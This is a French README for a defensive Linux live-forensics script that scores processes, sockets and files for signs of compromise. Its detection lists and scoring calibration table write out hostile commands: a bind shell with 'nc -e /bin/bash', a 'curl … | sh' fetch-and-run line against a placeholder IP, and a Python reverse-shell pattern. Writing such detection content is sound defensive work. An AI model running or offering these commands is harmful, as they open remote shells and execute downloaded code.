# linux_forensics

**DFIR Linux Sniper v2.3** — un script Python autonome de *live forensics* qui croise les connexions réseau actives, le comportement des processus en mémoire et les artefacts déposés sur disque pour détecter chirurgicalement les compromissions : canaux C2, malwares fileless, techniques LotL (*Living off the Land*), rootkits et mécanismes de persistance.

Chaque artefact retenu est restitué avec son **SHA256**, directement exploitable en pivot CTI (VirusTotal, MalwareBazaar, MISP, OpenCTI).

---

## Sommaire

- [Principes de conception](#principes-de-conception)
- [Installation](#installation)
- [Utilisation](#utilisation)
- [Options](#options)
- [Ce que le script analyse](#ce-que-le-script-analyse)
- [Comprendre la sortie](#comprendre-la-sortie)
- [Le moteur de scoring](#le-moteur-de-scoring)
- [Root vs utilisateur standard](#root-vs-utilisateur-standard)
- [Impact sur la machine analysée](#impact-sur-la-machine-analysée)
- [Intégration dans un workflow IR](#intégration-dans-un-workflow-ir)
- [Limites connues](#limites-connues)
- [Dépannage](#dépannage)

---

## Principes de conception

Le script est pensé pour être lancé **sur une machine potentiellement compromise, en production**, sans dégrader la scène de crime.

| Principe | Mise en œuvre |
|---|---|
| **Zéro dépendance** | Bibliothèque standard Python uniquement (`os`, `re`, `stat`, `hashlib`, `ipaddress`, `argparse`, `errno`, `sys`, `time`). Aucun `pip install`, aucun binaire externe appelé. |
| **Exécution en mémoire** | Aucune écriture disque, aucun fichier temporaire, aucun cache. La sortie va exclusivement sur `stdout`. |
| **Lecture seule stricte** | Ouverture en `O_RDONLY \| O_NOFOLLOW \| O_NONBLOCK \| O_NOATIME`. Aucun signal envoyé, aucun module chargé, aucune connexion réseau émise. |
| **Consentement explicite** | Un avertissement détaillé est affiché, puis une confirmation est demandée avant toute collecte. |
| **Résistance à l'hostilité** | Les symlinks ne sont jamais suivis, les FIFO et devices ne sont jamais ouverts, les séquences ANSI présentes dans les noms de fichiers ou les *cmdline* sont neutralisées avant affichage. |

**Compatibilité** : Python ≥ 3.6, tout Linux disposant de `/proc` (testé sur noyau 6.x, x86-64). L'endianness de la machine est gérée explicitement — le script fonctionne aussi sur ARM et big-endian.

---

## Installation

Aucune. Copiez le fichier et lancez-le.

```bash
# Depuis une clé USB, un partage read-only ou un pull direct
chmod +x linux_forensics.py
```

En réponse à incident, la bonne pratique est de **ne rien écrire sur la machine analysée** : exécutez le script depuis un montage en lecture seule et redirigez la sortie vers un collecteur distant.

```bash
ssh root@cible 'python3 -' < linux_forensics.py -- -y --no-color > cas-2026-042_cible.txt
```

---

## Utilisation

### Mode interactif (recommandé en analyse manuelle)

```bash
sudo python3 linux_forensics.py
```

Le script affiche son périmètre de privilèges, l'avertissement, puis attend une confirmation `y`/`n`. Rien n'est lu tant que vous n'avez pas confirmé.

### Mode non interactif (IR automatisée, orchestration, SOAR)

```bash
sudo python3 linux_forensics.py -y --no-color | tee /mnt/collecte/$(hostname)-$(date +%FT%H%M%S).log
```

L'avertissement reste affiché dans les deux cas. **Sans TTY et sans `-y`, le script refuse de démarrer** : c'est volontaire, pour qu'aucun scan ne parte d'un pipe mal maîtrisé.

### Exemples courants

```bash
# Triage rapide : réseau + processus + rootkit, sans parcours disque
sudo python3 linux_forensics.py -y --no-fs

# Chasse exhaustive, y compris un partage applicatif suspect
sudo python3 linux_forensics.py -y --extra-dir /opt/app --extra-dir /var/lib/tomcat

# Baisser le seuil pour tout voir, y compris le bruit de fond
sudo python3 linux_forensics.py -y --min-score 10 --min-file-score 10

# Scan éclair sans calcul d'empreintes (hôte chargé, I/O contraintes)
sudo python3 linux_forensics.py -y --no-hash

# Empreinter aussi les gros binaires (limite par défaut : 128 Mo)
sudo python3 linux_forensics.py -y --max-file-size 1073741824
```

---

## Options

| Option | Effet |
|---|---|
| `-y`, `--yes` | Consentement explicite, saute la question interactive. L'avertissement reste affiché. |
| `--no-color` | Désactive les séquences ANSI. Appliqué automatiquement si `stdout` n'est pas un TTY. |
| `--no-fs` | Ignore l'étape 4 (chasse sur le système de fichiers). |
| `--no-rootkit` | Ignore l'étape 3 (contrôles de dissimulation). |
| `--no-hash` | N'empreinte aucun fichier. Scan très rapide, mais plus de pivot CTI. |
| `--min-score N` | Seuil d'affichage des constats. Défaut : `30`. |
| `--min-file-score N` | Seuil de rétention d'un artefact fichier avant hachage. Défaut : `25`. |
| `--max-file-size N` | Taille maximale empreintée, en octets. Défaut : `134217728` (128 Mo). |
| `--verify-system` | Confronte **tous** les binaires système à la base de paquets. Détecte un binaire de distribution trojanisé même s'il n'est pas en cours d'exécution. Quelques secondes d'I/O en plus. |
| `--no-pkgcheck` | Désactive toute confrontation à la base de paquets (dpkg). |
| `--max-file-findings N` | Artefacts fichiers détaillés dans le rapport. Défaut : `150`. Au-delà, un constat indique le nombre tronqué. |
| `--max-hash-files N` | Plafond global de fichiers empreintés. Défaut : `2000`. Protège le CPU et les I/O sur une arborescence bruyante. |
| `--extra-dir CHEMIN` | Répertoire supplémentaire à inspecter. Répétable, chemin absolu obligatoire. |

Toutes les valeurs numériques sont bornées défensivement : une valeur absurde (`--max-file-size -1`) est ramenée à une valeur exploitable plutôt que de produire un rapport silencieusement vide.

---

## Ce que le script analyse

L'exécution se déroule en quatre étapes.

### Étape 1 — Cartographie réseau

Lecture directe de `/proc/net/{tcp,tcp6,udp,udp6}`. En root, les tables de **tous les namespaces réseau** distincts sont agrégées via `/proc/<pid>/net/`, ce qui rend visible un C2 opérant depuis un conteneur.

Sont conservés les états `ESTABLISHED`, `SYN_SENT` et `LISTEN` (TCP), ainsi que les sockets UDP. Le trafic strictement loopback est écarté, IPv4 comme IPv6.

### Étape 2 — Corrélation PID ↔ socket et scoring comportemental

Chaque processus est inspecté et noté. Signaux recherchés :

- **Binaire supprimé du disque mais toujours en exécution** (`/proc/<pid>/exe` → `… (deleted)`) — classique du malware fileless.
- **Exécution depuis un `memfd`** — binaire n'ayant jamais touché le disque.
- **Exécution depuis une zone monde-inscriptible** (`/tmp`, `/dev/shm`, `/var/tmp`, `/run/user`…) ou un répertoire caché.
- **Usurpation d'un nom de thread noyau** (`[kworker…]`, `[ksoftirqd…]`) par un processus disposant d'un binaire mappé.
- **Ligne de commande offensive** : reverse shells `/dev/tcp`, `nc -e`, one-liners Python/Perl/Ruby/PHP orientés socket, `socat exec:`, dropper `curl … | sh`, payload `base64 -d | sh`, anti-forensic (`history -c`, `HISTFILE=/dev/null`, `chattr +i`), noms de miners et malwares Linux connus, configuration de pool de minage.
- **Injection de bibliothèque** via `LD_PRELOAD` / `LD_AUDIT`, avec allowlist des intégrations légitimes (snap, NVIDIA, jemalloc, PAM…). Les bibliothèques préchargées sont elles-mêmes empreintées.
- **Contenu suspect** dans `LD_LIBRARY_PATH`, `PROMPT_COMMAND`, `BASH_ENV`, `ENV`, `PYTHONSTARTUP`.
- **Capacités noyau anormales** pour un processus non-root (`CAP_SYS_MODULE`, `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_BPF`, `CAP_DAC_READ_SEARCH`…).
- **Élévation de privilèges anormale** : EUID = 0 avec RUID ≠ 0 alors que le binaire ne porte pas le bit setuid (les binaires setuid légitimes comme `sudo` ou `pkexec` ne déclenchent rien).
- **Processus tracé** (`TracerPid` ≠ 0, injection ou débogage en cours).
- **Namespace réseau isolé**, en signal faible et informatif — un conteneur légitime ne doit pas générer d'alerte à lui seul.

Le binaire de chaque processus retenu est empreinté, y compris lorsqu'il a été supprimé : `/proc/<pid>/exe` reste lisible et constitue souvent **la seule copie récupérable de l'implant**.

**Intégrité par la base de paquets.** Le binaire de chaque processus est confronté aux empreintes publiées par la distribution, lues directement dans `/var/lib/dpkg/info/*.md5sums` — aucun appel à `dpkg`, aucun binaire externe, la contrainte « zéro dépendance » tient. Deux verdicts comptent : **MODIFIÉ** (le contenu diffère de l'empreinte du paquet, +80) et **hors-paquet** (le fichier est dans `/usr/bin`, `/usr/lib`… mais aucun paquet ne le revendique). C'est ce qui rend visible un implant déposé dans une arborescence de confiance, angle mort structurel des règles fondées sur le chemin. Les diversions `dpkg-divert` sont prises en compte. Sur un hôte non-dpkg, le contrôle est silencieusement ignoré.

**Par défaut**, en plus des binaires en cours d'exécution et des SUID, une confrontation légère et **non récursive** de `/usr/bin`, `/usr/sbin`, `/bin`, `/sbin` à la base de paquets est effectuée à chaque scan (quelques centaines à quelques milliers de fichiers, coût marginal) : elle ferme l'angle mort d'un implant déposé directement dans un de ces répertoires, sans bit SUID et jamais exécuté durant le scan. Le verdict **MODIFIÉ** y garde son poids plein (+80, signal rare et univoque). Le verdict **hors-paquet** y est en revanche pondéré plus bas (+25, sous le seuil d'affichage par défaut mais retenu dans la table de pivot CTI) : sur une image Docker officielle, des utilitaires ajoutés par l'outillage de construction plutôt que par un paquet (`policy-rc.d`, `pebble`, `initctl`…) sont courants et légitimes, et les signaler bruyamment par défaut aurait réintroduit le bruit que ce scanner cherche justement à éliminer. `--verify-system` (voir ci-dessous) étend le contrôle en profondeur (`/usr/lib`, `/usr/libexec`, 2 niveaux) et garde le poids plein (+45) sur le verdict hors-paquet, cohérent avec une demande explicite de vérification exhaustive.

### Étape 3 — Indicateurs de dissimulation (rootkit)

- **Processus cachés** : parcours de la plage de PID avec `stat()` et comparaison au listing de `/proc`. Un PID accessible mais absent du listing trahit un filtrage de `getdents()`. Double passe et collecte des TID pour écarter les processus créés pendant le scan.
- **Modules noyau masqués** : écart entre `/proc/modules` et `/sys/module` (un LKM qui se retire de `/proc/modules` reste souvent visible dans sysfs).
- **Kernel tainted** : bits « module propriétaire », « hors-arbre », « non signé », « erreur machine ».
- **Sockets TCP sans processus propriétaire** (root uniquement). Ce contrôle est **automatiquement atténué** si une vue partielle de `/proc` est détectée — `/.dockerenv`, cgroup de type conteneur, namespace PID distinct, PID 1 atypique — car des processus légitimes hors du namespace expliquent alors le phénomène.
- **`/etc/ld.so.preload`** présent et non vide : hooking userland global. Le fichier et chaque bibliothèque référencée sont empreintés.

### Étape 4 — Chasse aux artefacts sur disque

Répertoires inspectés, adaptés au niveau de privilège :

`/tmp`, `/var/tmp`, `/dev/shm`, `/run/shm`, `/dev/mqueue`, `/dev` (fichiers réguliers hors tmpfs légitime), `/run/user/*`, `/usr/local/{bin,sbin,lib}`, `/opt`, `/var/www`, `/srv`, les répertoires personnels et leurs sous-dossiers cachés (`.config`, `.local/share`, `.local/bin`, `.ssh`, `.cache`, `bin`…), et les points de persistance (`/etc/cron.*`, `/var/spool/cron`, `/etc/profile.d`, `/etc/update-motd.d`).

Sont retenus : les binaires ELF, les fichiers cachés, les exécutables en zone temporaire, les SUID/SGID, les noms conçus pour la dissimulation (`...`, espaces de début ou de fin, caractères Unicode invisibles, imitation de sockets système type `.X11-unix`), les fichiers de périphérique hors `/dev`, et `authorized_keys`.

**Vecteurs de persistance couverts** : tâches planifiées (`cron.*`, `crontabs`, jobs `at`), unités systemd (système, utilisateur et générateurs), autostart XDG et `environment.d`, fichiers de démarrage shell (`.bashrc`, `.profile`, `.zshrc`, `/etc/profile.d`…), règles `udev`, `ld.so.conf.d`, `init.d`, `apt.conf.d`, `sudoers.d`, `authorized_keys`.

**Balayage SUID/SGID** des chemins système : un binaire SUID dont l'empreinte correspond à celle d'un interpréteur présent sur l'hôte est une porte dérobée d'élévation quel que soit son nom (+90). Les SUID légitimes — `sudo`, `mount`, `passwd`, `pkexec` — sont revendiqués par un paquet et ne produisent aucun constat.

Le **contenu** des scripts déposés en zone temporaire et des tâches planifiées est analysé : un dropper en clair dans `/tmp` remonte en CRITIQUE, pas en MOYEN. Les tâches planifiées appartenant à la distribution (root, non monde-inscriptibles) qui se contentent d'appeler `curl` ou `wget` ne déclenchent pas d'alerte.

Enfin, les fichiers de persistance de référence (`/etc/ld.so.preload`, `/etc/rc.local`, `/etc/crontab`, `/etc/sudoers`, `/etc/hosts.deny`) sont systématiquement empreintés pour comparaison avec une baseline.

**Bornes de sûreté** : profondeur maximale de 6 niveaux, budget global de 60 000 fichiers parcourus, plafond de 2 000 fichiers empreintés, 150 artefacts détaillés dans le rapport, plafond par racine, aucun franchissement de point de montage (les partages réseau ne sont jamais parcourus), symlinks jamais suivis, moteur regex borné à 64 Ko par fichier. Chaque plafond atteint génère un constat explicite plutôt qu'une troncature silencieuse.

---

## Comprendre la sortie

### Constats

```
[CRITIQUE] PID 543 (.pysrv) — score 140
    PPID        : 1   UID : 0
    Binaire     : /tmp/.cache-x/.pysrv
    Cmdline     : /tmp/.cache-x/.pysrv /tmp/.cache-x/.listener.py
    Connexion   : TCP LISTEN 0.0.0.0:41414 -> 0.0.0.0:0
    Motif (+55 ): Exécution depuis une zone monde-inscriptible : /tmp/.cache-x/.pysrv
    Motif (+70 ): Injection de bibliothèque via LD_PRELOAD=/tmp/.cache-x/libevil.so
    Motif (+15 ): Socket en écoute exposé hors loopback (backdoor ?)
    SHA256      : 8295ee25…4f42  (binaire du PID 543 (ELF))
```

Chaque ligne `Motif` indique le poids exact ajouté au score, ce qui rend le verdict auditable : vous voyez précisément **pourquoi** un objet a été retenu, et vous pouvez écarter un signal que vous jugez normal dans votre environnement.

Les constats sont regroupés par catégorie : `ROOTKIT`, `PROCESSUS`, `FICHIER`, `PERSISTANCE`, et triés par score décroissant.

### Table de pivot CTI

Le rapport se termine par la liste dédupliquée des empreintes collectées, au format `SHA256␣␣chemin` — directement copiable dans un outil de threat intelligence ou une recherche de rétrohunt.

```
==============================================================================
  EMPREINTES SHA256 COLLECTEES (pivot CTI)
==============================================================================
Inclut les artefacts retenus sous le seuil d'affichage : soumettre l'ensemble
aux sources CTI avant de conclure.
8295ee25cfdb239f3e165afceda7f46de73e2b606ff0e2e3d8623e3facd30acc  /tmp/.cache-x/.pysrv
                                                                  artefact ELF
```

Cette table inclut volontairement des artefacts sous le seuil d'affichage : un fichier anodin en apparence peut être un implant connu des bases CTI.

### Bandeau de fin

```
Durée : 0.2s | Fichiers empreintés : 15 (31Mo) | Lectures refusées : 3
Ouvertures O_NOATIME : 803 | Repli sans O_NOATIME (atime modifié) : 0
```

Le compteur de repli vous dit **exactement combien d'atimes ont été modifiés** pendant la collecte — information à consigner dans votre main courante.

---

## Le moteur de scoring

Le script n'applique pas de règles binaires : chaque signal apporte un poids, et l'objet n'est restitué qu'au-delà d'un seuil. C'est le mécanisme central de réduction des faux positifs.

| Score | Niveau | Lecture |
|---|---|---|
| ≥ 70 | **CRITIQUE** | Un signal à lui seul très rarement légitime, ou un faisceau convergent. Investiguer immédiatement. |
| 50–69 | **ÉLEVÉ** | Fortement anormal, contexte à valider. |
| 30–49 | **MOYEN** | À corréler avec le reste du rapport et la baseline de l'hôte. |
| < 30 | INFO | Non affiché par défaut, mais l'empreinte reste dans la table CTI. |

Exemples de calibrage vérifiés :

| Ligne de commande | Score |
|---|---|
| `curl -s https://deb.example.org/key.gpg -o /etc/apt/key.gpg` | 0 |
| `nc -z 10.0.0.1 443` | 0 |
| `python3 -c "import sys; print(sys.version)"` | 0 |
| `python3 -c "import subprocess…"` | 25 (sous le seuil) |
| `python3 -c "…socket…os.dup2…pty.spawn…"` | 60 |
| `nc -lvp 4444 -e /bin/bash` | 65 |
| `sh -c "curl -s http://1.2.3.4/a.sh \| sh"` | 70 |

Ajustez `--min-score` selon votre besoin : abaissez-le en investigation ciblée, montez-le en balayage de parc.

---

## Faux positifs traités

Le scoring seul ne suffit pas : certains mécanismes Linux parfaitement légitimes ressemblent trait pour trait à une compromission. Les cas suivants ont été rencontrés en conditions réelles et sont neutralisés à la source.

| Cas légitime | Pourquoi ça ressemblait à une attaque | Traitement |
|---|---|---|
| `sudo`, `su`, `pkexec`, `fusermount3`, `mount`, `ping` | RUID ≠ EUID = 0 | C'est le mécanisme setuid lui-même. La règle ne se déclenche que si le binaire **ne porte pas** le bit setuid — le cas réellement anormal (élévation obtenue par un autre biais). |
| `xfsettingsd`, `mdadm`, `mdmon`, `watchdogd` | Le nom commence comme un thread noyau (`xfs`, `md`, `watchdog`) | Un thread noyau se reconnaît à sa forme réelle : nom contenant `/` (`kworker/0:1`, `jbd2/sda1-8`), nom exact figé (`kthreadd`, `kswapd0`), ou crochet initial. Plus aucun préfixe nu. |
| `/run/user/<uid>/systemd/inaccessible/{chr,blk,…}` | Nœuds de périphérique hors `/dev` | Allowlist de ces chemins : systemd les crée en mode 0000 pour `InaccessiblePaths=`. Un nœud de périphérique ailleurs reste signalé. |
| Listes d'IoC, cheat-sheets, outils de sécurité posés dans `/tmp` | Le fichier contient `/dev/tcp/`, `nc -e`, `HISTFILE=/dev/null`… | Un dropper est court et concentre une ou deux techniques ; un fichier qui les cumule toutes est une liste d'IoC. Au-delà de 4 techniques distinctes, le contenu n'est plus scoré et le constat le dit. Le script s'exclut également de sa propre chasse. |
| Binaires SUID d'administration dans `/usr/local/bin` ou `/opt` | Bit SUID positionné | Pondéré selon la zone : critique en `/tmp`, `/dev/shm` ou chemin caché, simple signalement ailleurs (à confronter à la baseline). |
| Firefox, Chrome, snapd, NVIDIA, jemalloc (`LD_PRELOAD=libmozsandbox.so`…) | Injection de bibliothèque | La bibliothèque n'est plus jugée sur son nom mais sur celle qui est **réellement chargée** : le soname relatif est résolu via `/proc/<pid>/maps`, puis évalué sur sa provenance, son propriétaire et ses permissions. Sous `/usr/lib` appartenant à root et non inscriptible par d'autres = silence. En zone temporaire, home ou chemin caché = critique, même si le fichier a disparu. |
| Fichiers de session X11/XFCE (`.X0-lock`, `.xfsm-ICE-*`, `.ICEauthority`, `.pulse-*`) | Fichiers cachés dans `/tmp` | Écartés s'ils sont inertes : données pures, non exécutables, < 64 Ko. Un ELF ou un script portant l'un de ces noms reste signalé. |
| Conteneurs Docker / LXC | Namespace réseau isolé, sockets sans propriétaire visible | Le namespace isolé est un signal faible (+10). Les sockets orphelins sont automatiquement atténués si une vue partielle de `/proc` est détectée, et le constat explique pourquoi. |
| Tâches planifiées de distribution (`update-motd`, `apt`, `certbot`) | Elles appellent `curl` ou `wget` | Deux niveaux : appel réseau nu dans une tâche appartenant à root et non monde-inscriptible = ignoré ; shell distant, décodage exécuté ou référence à `/tmp` = signalé. |

Si un cas légitime propre à votre parc remonte encore, le détail `Motif (+N)` indique exactement la règle et son poids : montez `--min-score` au-dessus de ce poids pour l'écarter sans perdre le reste.

---

## Root vs utilisateur standard

Le script s'exécute dans les deux cas et annonce clairement son périmètre.

| Contrôle | Root | Utilisateur standard |
|---|---|---|
| Tables de sockets de tous les namespaces | ✅ | ❌ (namespace courant seulement) |
| Corrélation PID ↔ socket sur tous les processus | ✅ | Limitée aux processus de l'UID |
| Lecture de `environ`, `exe`, `fd` des processus tiers | ✅ | ❌ |
| Détection de processus cachés | ✅ | ✅ |
| Modules noyau masqués, kernel tainted | ✅ | ✅ |
| Sockets sans propriétaire | ✅ | ❌ (ignoré, signalé dans la sortie) |
| Chasse fichiers dans tous les homes | ✅ | Home courant uniquement |
| `O_NOATIME` | ✅ sur tous les fichiers | Uniquement sur ses propres fichiers |

Une exécution root est nettement plus complète, mais une exécution utilisateur reste utile lorsque l'escalade n'est pas encore autorisée par le processus IR.

---

## Impact sur la machine analysée

Ce que le script fait :

- Il lit `/proc`, `/sys` et un ensemble borné de répertoires.
- Il consomme du CPU pour le calcul SHA256 (proportionnel au volume empreinté, affiché en fin de rapport).
- Il peut mettre à jour l'`atime` des fichiers lus **lorsque `O_NOATIME` n'est pas accessible** (fichiers dont vous n'êtes pas propriétaire, sans `CAP_FOWNER`). Le compteur exact est affiché.

Ce que le script ne fait **jamais** :

- Écrire, créer, supprimer ou déplacer un fichier.
- Modifier une permission, un `mtime`, un `ctime` ou une taille (vérifié par snapshot avant/après).
- Envoyer un signal, tuer un processus, charger un module.
- Émettre la moindre connexion réseau ou remonter des données vers un tiers.
- Suivre un symlink ou ouvrir un FIFO / device (aucun risque de blocage ni de lecture détournée).

---

## Intégration dans un workflow IR

1. **Avant tout** : si la volatilité prime, capturez la RAM et le trafic réseau. Ce script lit la mémoire du noyau via `/proc`, il ne la remplace pas.
2. Lancez le scan en redirigeant la sortie hors de la machine.
3. Traitez le transcript comme une pièce à conviction : il contient des *cmdline* et des chemins utilisateurs potentiellement sensibles.
4. Soumettez la table SHA256 à vos sources CTI. Un hash inconnu n'innocente pas ; un hash connu accélère la qualification.
5. Pour tout constat CRITIQUE portant sur un binaire supprimé, **récupérez la copie via `/proc/<pid>/exe` avant de tuer le processus** — c'est souvent la seule copie existante.
6. Confirmez par une acquisition mémoire : sur un hôte rootkité, le noyau peut mentir au script.

---

## Limites connues

- **Le script fait confiance au noyau.** Un rootkit LKM suffisamment abouti peut falsifier `/proc`, `/sys` et les résultats de `stat()`. Les contrôles de dissimulation détectent les rootkits qui filtrent naïvement `getdents()` ou `/proc/modules`, pas ceux qui hookent l'ensemble de la chaîne.
- **Aucune analyse mémoire.** Pas de lecture de `/proc/<pid>/mem`, pas de détection d'injection de code en mémoire ni de hooking de GOT/PLT.
- **Aucune analyse de journaux.** Ni `auth.log`, ni `wtmp`, ni journald, ni historiques shell.
- **Vérification d'intégrité limitée à dpkg.** Les hôtes RPM, Alpine ou immuables ne sont pas couverts : le contrôle est alors silencieusement ignoré et l'angle mort « implant dans un chemin de confiance » réapparaît.
- **Profondeur de parcours bornée à 6 niveaux** : un implant enfoui plus profondément dans `/tmp` sera manqué. Utilisez `--extra-dir` sur le sous-répertoire concerné.
- **Rootkits noyau non testés en conditions réelles.** Les contrôles de dissimulation sont validés sur des simulations, pas contre un LKM comme Diamorphine ou Reptile.
- **Détection d'IoC comportementale, pas signature.** Un implant compilé sur mesure, lancé depuis un chemin système standard, sans variable d'environnement ni cmdline suspecte et communiquant sur 443, peut passer sous le seuil.

---

## Dépannage

**« Entrée standard non interactive et `--yes` absent : annulation par sécurité »**
Vous avez lancé le script dans un pipe ou une tâche planifiée. Ajoutez `-y`.

**Beaucoup de « Lectures refusées » dans le bandeau final**
Vous êtes en utilisateur standard. C'est le comportement attendu : les objets appartenant à d'autres UID sont illisibles. Relancez en root pour un périmètre complet.

**« SHA256 : NON-CALCULE (taille > limite) »**
Le fichier dépasse 128 Mo. Relancez avec `--max-file-size` au-dessus de sa taille.

**Une alerte « sockets sans processus propriétaire » sur un hôte conteneurisé**
Le script détecte et signale l'atténuation dans le constat lui-même. Rejouez le scan depuis l'hôte pour trancher.

**Le scan est lent sur un serveur de fichiers**
Utilisez `--no-hash` pour un triage rapide, ou `--no-fs` pour ne garder que l'analyse réseau et processus.

**« Restitution tronquée : N artefact(s) supplémentaire(s) non détaillé(s) »**
L'arborescence est bruyante (serveur de build, `/tmp` partagé). Les artefacts les mieux notés sont détaillés en premier. Ciblez avec `--extra-dir`, remontez `--min-file-score`, ou relevez `--max-file-findings`.

**« Plafond de hachage atteint : N fichier(s) non empreinté(s) »**
Plus de 2 000 fichiers candidats. Relevez `--max-hash-files` si vous avez le temps machine, ou réduisez le périmètre.

**Séquences ANSI illisibles dans un fichier de sortie**
Ajoutez `--no-color`. La détection automatique de TTY couvre la plupart des cas, mais pas toutes les configurations de terminal.
